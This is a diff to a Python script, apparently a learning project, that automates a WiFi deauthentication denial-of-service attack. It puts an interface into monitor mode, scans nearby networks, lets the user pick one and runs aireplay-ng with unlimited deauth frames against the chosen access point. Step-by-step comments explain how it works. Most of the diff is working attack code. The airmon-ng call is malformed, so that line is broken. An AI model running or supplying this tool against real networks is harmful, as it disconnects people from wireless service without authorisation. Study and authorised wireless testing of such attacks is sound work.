@@ -158,7 +158,39 @@ def set_target_network():
 # A person must choose based off "int" meaning they can choose "1,2,3,4" as that interprets at "Num" or "index" from previous function(number corresponds to networks Num/index)
 # If chosen, returns the network chose, if choice resolves to an error, user entered something different than "int" such as "2,34" or "number1"
 
-perform_dos_attack():
+def perform_dos_attack(interface, target_bssid, channel):
+    logging.info(f"Switching {interface} to channel{channel} for DoS attack")
+    run_command(["airmon-ng, start, f{interface}mon", channel])
+    logging.info(f"Starting DoS attack on {target_bssid}")
+    run_command(["aireplay-ng", "--deauth", "0", "-a", target_bssid, f"{interface}mon"])
+# This function performs the attack which takes into account 3 parameter including interface "wlan0mon", target_BSSID "Mac Address", and channel "1,6,11"
+# We log an info message stating we are switching interface to target network's channel
+# Run command to verify if airmon-ng start command switches to interface of targeted network's channel("mon" = monitor mode)
+# log a message stating which network will be targeted in relation to target_bssid
+# Run "aireplay-ng" tp inject packets for deauthentication, as "0"--> attack will not stop sending deauthentication frames
+
+if __name__ == "__main__":
+    check_superuser()
+    archive_csv_files()
+    wireless_interfaces = discover_wireless_adapters()
+
+    print("Available WiFi interfaces:")
+    for i, iface in enumerate(wireless_interfaces):
+        print(f"{i} - {iface}")
+    iface_choice = int(input("Pick interface to use for attack:"))
+    selected_interface = wireless_interfaces[iface_choice]
+# name = main --> We can import this script into another one without it running automatically in this one. 
+# We check if superuser is performing/move existing .csv files to temp directory/find interfaces/adapters that can be put in monitor mode
+# for i, iface --> this loop interates available interfaces, printing each with an index number such as 0-wlan0, 1-wlan1 
+# User selects iterface of interest and program stores it
+
+    terminate_conflicting_processes()
+    enable_monitor_mode()
+    scan_networks(selected_interface)
+# This prepares for the attack by eliminating processes that conflict with monitor mode such as network manager, places wireless interface into monitor mode, scans close networks using "airodump-ng" displaying such headers 
+
+    target_network = set_target_network()
+    perform_dos_attack(selected_interface, target_network["BSSID"], target_network["channel"].strip())
 
 
 
